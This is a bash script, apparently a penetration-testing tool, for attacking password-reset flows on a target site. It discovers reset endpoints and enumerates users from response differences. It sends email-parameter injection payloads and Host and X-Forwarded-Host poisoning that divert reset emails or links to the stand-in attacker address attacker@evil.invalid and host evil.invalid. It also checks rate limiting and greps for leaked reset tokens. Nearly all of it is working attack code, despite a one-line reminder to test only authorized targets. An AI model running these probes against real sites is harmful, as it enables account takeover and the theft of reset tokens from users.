#!/usr/bin/env bash
# reset_probe.sh — passive-first triage for password-reset flows.
# Usage: BASE=https://target.tld EMAIL=you@mail.tld [KNOWN=valid@mail.tld] ./reset_probe.sh
# Read this file before running. Only run against authorized targets.
set -u

BASE="${BASE:-}"
EMAIL="${EMAIL:-}"
KNOWN="${KNOWN:-}"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"

if [[ -z "$BASE" || -z "$EMAIL" ]]; then
  echo "[-] Set BASE and EMAIL. e.g. BASE=https://t.tld EMAIL=me@mail.tld $0"
  exit 1
fi
command -v curl >/dev/null || { echo "[-] curl required"; exit 1; }

sep(){ printf '\n=== %s ===\n' "$1"; }
req(){ # req <label> <curl-args...>
  local label="$1"; shift
  local out code
  out=$(curl -sS -A "$UA" -o /tmp/.rp_body -w '%{http_code}|%{size_download}|%{time_total}' "$@" 2>/tmp/.rp_err)
  code="$out"
  printf '%-38s HTTP=%s  bytes=%s\n' "$label" "${code%%|*}" "$(echo "$out"|cut -d'|' -f2)"
}

sep "0. Discover reset endpoints"
for p in /forgot_password /forgot-password /users/forgotten_password /account/recover \
         /password/forgot /password/reset /reset /api/auth/forgot /api/v1/auth/forgot \
         /auth/forgot-password /session/forgot; do
  c=$(curl -sS -A "$UA" -o /dev/null -w '%{http_code}' "$BASE$p" 2>/dev/null)
  [[ "$c" =~ ^(200|301|302|401|403|405)$ ]] && printf '  [%s] %s\n' "$c" "$BASE$p"
done

sep "1/7. User enumeration (known vs unknown email)"
if [[ -n "$KNOWN" ]]; then
  req "known  : $KNOWN"   -X POST "$BASE/forgot_password" -d "email=$KNOWN"
else
  echo "  (set KNOWN=valid@mail.tld to compare)"
fi
req "unknown: nobody-$(date +%s)@nope.invalid" -X POST "$BASE/forgot_password" -d "email=nobody-$(date +%s)@nope.invalid"
echo "  -> If HTTP/bytes/time differ between known and unknown, that's enumeration."

sep "2. Email-param injection (inspect what gets delivered)"
req "HPP duplicate"       -X POST "$BASE/forgot_password" -d "email=$EMAIL&email=attacker@evil.invalid"
req "newline/CC (raw)"    -X POST "$BASE/forgot_password" --data-urlencode "email=$EMAIL
cc:attacker@evil.invalid"
req "separator comma"     -X POST "$BASE/forgot_password" -d "email=$EMAIL,attacker@evil.invalid"
req "JSON array"          -X POST "$BASE/forgot_password" -H 'Content-Type: application/json' \
                              -d "{\"email\":[\"$EMAIL\",\"attacker@evil.invalid\"]}"

sep "3. Host-header poisoning (does the link follow the header?)"
req "X-Forwarded-Host"    -X POST "$BASE/forgot_password" -d "email=$EMAIL" -H "X-Forwarded-Host: evil.invalid"
req "Host override"       -X POST "$BASE/forgot_password" -d "email=$EMAIL" -H "Host: evil.invalid"
echo "  -> Check the delivered email: does the reset link host = evil.invalid? Then it's exploitable."

sep "6. Rate limit (5 rapid requests)"
for i in $(seq 1 5); do
  c=$(curl -sS -A "$UA" -o /dev/null -w '%{http_code}' -X POST "$BASE/forgot_password" -d "email=$EMAIL" 2>/dev/null)
  printf '  req %d -> %s\n' "$i" "$c"
done
echo "  -> No 429/lockout after 5 = no rate limiting (chain with enumeration for impact)."

sep "8. Token leak in response (check body of a real request)"
echo "  Run: curl -sS -A '$UA' -X POST '$BASE/forgot_password' -d 'email=$EMAIL' | tee /tmp/.rp_resp"
echo "  Grep: grep -Eo '(token|reset_password_link|resetPasswordLink|code)=[A-Za-z0-9._-]+' /tmp/.rp_resp"
echo "  Also check the Referer vector: open the reset page, click any 3rd-party link, inspect Referer."

sep "Done"
echo "Reminder: only proven ATO vectors (token leak/reuse, host poisoning, email-param) are high severity."
